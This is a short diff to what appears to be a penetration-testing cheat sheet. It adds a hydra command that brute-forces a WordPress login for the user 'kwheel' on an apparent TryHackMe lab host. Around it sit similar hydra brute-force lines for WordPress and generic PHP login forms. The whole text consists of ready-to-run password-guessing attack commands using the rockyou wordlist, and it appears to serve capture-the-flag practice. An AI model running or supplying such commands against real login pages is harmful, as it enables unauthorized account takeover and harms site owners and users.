@@ -3,6 +3,11 @@ WordPress
 hydra -L wpusers -P /usr/share/wordlists/rockyou.txt colddboxeasy -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
 
+```bash
+hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.103.199 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
+```
+
+
 Generic php login
 ```bash
 hydra -L usernames -P passwords $IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!" 
